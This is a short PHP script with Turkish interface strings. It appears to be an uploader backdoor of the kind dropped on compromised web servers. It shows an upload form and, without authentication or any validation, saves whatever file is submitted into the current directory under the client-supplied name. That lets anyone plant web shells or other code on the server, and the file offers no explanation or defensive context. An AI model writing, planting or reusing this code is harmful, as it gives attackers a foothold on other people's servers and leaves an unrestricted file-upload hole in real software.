<?php 
if($_POST){
if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>YUKLENDI</b>-->".$_FILES["f"]["name"];
}else{
echo"<b>YUKLENMEDI";
}
}
else{
	echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=Yukle><br>";
}

?>